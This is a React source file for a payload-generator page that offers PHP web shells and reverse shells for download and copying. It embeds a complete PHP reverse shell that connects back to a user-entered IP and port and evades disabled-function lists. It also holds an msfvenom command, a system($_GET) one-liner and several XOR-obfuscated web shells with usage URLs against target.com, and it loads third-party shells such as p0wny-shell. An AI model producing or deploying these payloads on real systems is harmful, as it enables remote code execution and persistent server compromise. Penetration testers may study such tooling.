import React, { useState } from 'react';
import PersistedState from 'use-persisted-state';
import { Input, Button, message, Typography, Row, Col, Divider, Collapse } from 'antd';
import {
    CopyOutlined,
    WifiOutlined,
    DownloadOutlined,
    ArrowsAltOutlined,
    createFromIconfontCN
} from '@ant-design/icons';
import Clipboard from 'react-clipboard.js';
import SyntaxHighlighter from 'react-syntax-highlighter';
import { Ipv4TcpCacheState } from "components/types/Ipv4TcpCacheState";
import { vs2015 } from 'react-syntax-highlighter/dist/esm/styles/hljs';
import pretty from 'pretty';
// i18n
import '../../i18n';
import { useSSR, useTranslation } from 'react-i18next';
//
import { useFetchTextFile } from '../utils/getFile'

const { Title, Paragraph, Text } = Typography;
const { Panel } = Collapse;
const IconFont = createFromIconfontCN({
    scriptUrl: ['./iconfont.js']
});


export default function PHPWebShell() {
    const { t } = useTranslation();
    const useIPv4State = PersistedState<Ipv4TcpCacheState>('ipv4_tcp_cache');
    const [values, setValues] = useIPv4State({
        ip: '',
        port: '',
    });

    const imageStyle = {
        maxHeight: '50vh', // 图片最大高度为屏幕高度的50%
        maxWidth: '100%', // 图片最大宽度为100%
        display: 'block', // 让图片居中显示
        margin: '0 auto' // 让图片水平居中
    };

    const handleChange = (name: string) => (event: { target: { value: string; }; }) => {
        setValues({ ...values, [name]: event.target.value });
    };

    const [messageApi, contextHolder] = message.useMessage();
    const successInfoReverseShell = () => {
        messageApi.success('Your reverse shell has been copied successfully !');
    };

    const oneLiner = `<?php system($_GET["cmd"]);?>`;
    const shell_obfuscate =
        `<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
        "${$_}['_'^'o'];echo`$_`?>";
    const shell_obfuscate_function =
        `<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` + "<?=${'_'.$_}['_'](${'_'.$_}['__']);?>";

    const p0wny_shell = useFetchTextFile(require('../../static/data/p0wny_shell.txt'));
    const filebox = useFetchTextFile(require('../../static/data/filebox.txt'));
    const tinyfilemanager = useFetchTextFile(require('../../static/data/tinyfilemanager.txt'));
    const phpexplorer = useFetchTextFile(require('../../static/data/php_explorer.txt'));
    // $ip = '${values.ip}';  // You have changed this
    // $port = ${values.port};  // And this
    const phpReverseShell = `
    /*<?php /**/
    @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
    $dis=@ini_get('disable_functions');
    if(!empty($dis)){
      $dis=preg_replace('/[, ]+/',',',$dis);
      $dis=explode(',',$dis);
      $dis=array_map('trim',$dis);
    }else{
      $dis=array();
    }
    
  $ipaddr='${values.ip}';
  $port='${values.port}';

  if(!function_exists('vOstmyUkExbOQ')){
    function vOstmyUkExbOQ($c){
      global $dis;
      
    if (FALSE !== stristr(PHP_OS, 'win' )) {
      $c=$c." 2>&1\n";
    }
    $xQYwyHS='is_callable';
    $lUAN='in_array';
    
    if($xQYwyHS('exec')&&!$lUAN('exec',$dis)){
      $o=array();
      exec($c,$o);
      $o=join(chr(10),$o).chr(10);
    }else
    if($xQYwyHS('system')&&!$lUAN('system',$dis)){
      ob_start();
      system($c);
      $o=ob_get_contents();
      ob_end_clean();
    }else
    if($xQYwyHS('shell_exec')&&!$lUAN('shell_exec',$dis)){
      $o=\`$c\`;
    }else
    if($xQYwyHS('proc_open')&&!$lUAN('proc_open',$dis)){
      $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
      $o=NULL;
      while(!feof($pipes[1])){
        $o.=fread($pipes[1],1024);
      }
      @proc_close($handle);
    }else
    if($xQYwyHS('popen')&&!$lUAN('popen',$dis)){
      $fp=popen($c,'r');
      $o=NULL;
      if(is_resource($fp)){
        while(!feof($fp)){
          $o.=fread($fp,1024);
        }
      }
      @pclose($fp);
    }else
    if($xQYwyHS('passthru')&&!$lUAN('passthru',$dis)){
      ob_start();
      passthru($c);
      $o=ob_get_contents();
      ob_end_clean();
    }else
    {
      $o=0;
    }
  
      return $o;
    }
  }
  $nofuncs='no exec functions';
  if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
    $s=@fsockopen("tcp://$ipaddr",$port);
    while($c=fread($s,2048)){
      $out = '';
      if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
      }else{
        $out=vOstmyUkExbOQ(substr($c,0,-1));
        if($out===false){
          fwrite($s,$nofuncs);
          break;
        }
      }
      fwrite($s,$out);
    }
    fclose($s);
  }else{
    $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
    @socket_connect($s,$ipaddr,$port);
    @socket_write($s,"socket_create");
    while($c=@socket_read($s,2048)){
      $out = '';
      if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
      }else{
        $out=vOstmyUkExbOQ(substr($c,0,-1));
        if($out===false){
          @socket_write($s,$nofuncs);
          break;
        }
      }
      @socket_write($s,$out,strlen($out));
    }
    @socket_close($s);
  }
  `;
    return (
        <div>
            {contextHolder}
            <div>
                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                    {t('php_webshell_title')}
                </Title>
                <Paragraph style={{ margin: 15 }}>
                    {t('php_webshell_desc')}
                </Paragraph>
                <div style={{ padding: 15 }}>
                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                        <Col span={12}>
                            <Input
                                maxLength={15}
                                prefix={<WifiOutlined />}
                                name='Ip adress'
                                placeholder='IP Address or domain (ex: 212.212.111.222)'
                                onChange={handleChange('ip')}
                                value={values.ip}
                            />
                        </Col>
                        <Col span={12}>
                            <Input
                                maxLength={5}
                                type="number"
                                prefix={<IconFont type='icon-Network-Plug' />}
                                name='Port'
                                placeholder='Port (ex: 1337)'
                                onChange={handleChange('port')}
                                value={values.port}
                            />
                        </Col>
                    </Row>
                </div>
            </div>
            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>MSF reverse shell</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>{t('php_webshell_desc1')}</Paragraph>
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_showsource')} key='1'>
                        <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                            {pretty(phpReverseShell)}
                        </SyntaxHighlighter>
                    </Panel>
                </Collapse>
                <Paragraph />
                <Paragraph>
                    MsfVenom:
                </Paragraph>
                <Paragraph><pre><Text copyable>{`msfvenom -p php/reverse_php LHOST=${values.ip} LPORT=${values.port} --platform php -o reverse_shell.php`}</Text></pre></Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([phpReverseShell], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'reverse_shell.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
            </div>
            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>Basic RCE</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    {t('php_webshell_desc2')}
                </Paragraph>
                <Paragraph><pre><Text copyable>{oneLiner}</Text></pre></Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([oneLiner], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'basicRCE.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
                <Clipboard component='a' data-clipboard-text={oneLiner}>
                    <Button
                        type='dashed'
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                        onClick={successInfoReverseShell}
                    >
                        <CopyOutlined />
                        Copy
                    </Button>
                </Clipboard>
            </div>
            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>Web Shell - PownyShell</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    {t('php_webshell_p0wny_desc')}
                </Paragraph>
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_preview')} key='1'>
                        <div style={{ height: '50vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            <img
                                src='./img/Snipaste_2024-05-15_12-26-59.png'
                                alt='pownyShell'
                                style={imageStyle}
                            />
                        </div>
                    </Panel>
                </Collapse>
                <br />
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_showsource')} key='1'>
                        <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                            {pretty(p0wny_shell)}
                        </SyntaxHighlighter>
                    </Panel>
                </Collapse>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([p0wny_shell], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'p0wny_shell.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
                <Button
                    href="https://github.com/flozz/p0wny-shell" target='blank'
                    style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                >
                    <ArrowsAltOutlined />
                    repository: p0wny-shell
                </Button>
            </div>
            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>Web Shell - FileBox</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    {t('php_webshell_filebox_desc')}
                </Paragraph>
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_preview')} key='1'>
                        <div style={{ height: '50vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            <img
                                src='./img/Snipaste_2024-05-15_15-53-01.png'
                                alt='FileBox'
                                style={imageStyle}
                            />
                        </div>
                    </Panel>
                </Collapse>
                <br />
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_showsource')} key='1'>
                        <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                            {pretty(filebox)}
                        </SyntaxHighlighter>
                    </Panel>
                </Collapse>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([filebox], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'filebox.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
                <Button
                    href="https://github.com/CaoJingBiao/filebox" target='blank'
                    style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                >
                    <ArrowsAltOutlined />
                    repository: filebox
                </Button>
            </div>
            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>Web Shell - TinyFileManager</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    {t('php_webshell_tinyfilemanager_desc')}
                </Paragraph>
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_preview')} key='1'>
                        <div style={{ height: '50vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            <img
                                src='./img/Snipaste_2024-05-15_16-19-50.png'
                                alt='tinyfilemanager'
                                style={imageStyle}
                            />
                        </div>
                    </Panel>
                </Collapse>
                <br />
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_showsource')} key='1'>
                        <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                            {pretty(tinyfilemanager)}
                        </SyntaxHighlighter>
                    </Panel>
                </Collapse>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([tinyfilemanager], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'tinyfilemanager.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
                <Button
                    href="https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php" target='blank'
                    style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                >
                    <ArrowsAltOutlined />
                    repository: tinyfilemanager
                </Button>
            </div>

            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>Web Shell - PHP Explorer</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    {t('php_webshell_phpexplorer_desc')}
                </Paragraph>
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_preview')} key='1'>
                        <div style={{ height: '50vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            <img
                                src='./img/Snipaste_2024-05-15_16-35-57.png'
                                alt='phpexplorer'
                                style={imageStyle}
                            />
                        </div>
                    </Panel>
                </Collapse>
                <br />
                <Collapse defaultActiveKey={['0']}>
                    <Panel header={t('php_webshell_showsource')} key='1'>
                        <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                            {pretty(phpexplorer)}
                        </SyntaxHighlighter>
                    </Panel>
                </Collapse>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([phpexplorer], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'php_explorer.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
            </div>

            {/*  */}
            <Divider orientation="center" style={{ borderTopColor: 'black' }}>{t('php_webshell_obfuscate')}</Divider>
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{'<?=`$_GET[0]`?>'}</Text></pre></Paragraph>
                <Paragraph>{' Usage : http://target.com/path/to/shell.php?0=command '}</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob(['<?=`$_GET[0]`?>'], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'obfuscateShell_1.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={'<?=`$_GET[0]`?>'}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div>
            <Divider dashed />
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{'<?=`$_POST[0]`?>'}</Text></pre></Paragraph>
                <Paragraph>{' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '}</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob(['<?=`$_POST[0]`?>'], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'obfuscateShell_2.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={'<?=`$_POST[0]`?>'}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div>
            <Divider dashed />
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{"<?=`{$_REQUEST['_']}`?>"}</Text></pre></Paragraph>
                <Paragraph>Usage :</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
                <Paragraph>- curl -X POST http://target.com/path/to/shell.php -d "_=command" '</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob(["<?=`{$_REQUEST['_']}`?>"], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'obfuscateShell_3.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div >
            <Divider dashed />
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{shell_obfuscate}</Text></pre></Paragraph>
                <Paragraph>Usage :</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?0=command</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([shell_obfuscate], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'obfuscateShell_4.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={shell_obfuscate}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div >
            <Divider dashed />
            <div
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{shell_obfuscate_function}</Text></pre></Paragraph>
                <Paragraph>Usage :</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?_=function&__=argument</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?_=system&__=ls</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement('a');
                        const file = new Blob([shell_obfuscate_function], {
                            type: 'text/plain'
                        });
                        element.href = URL.createObjectURL(file);
                        element.download = 'obfuscateShell_5.php';
                        document.body.appendChild(element);
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div >
        </div >
    );
};
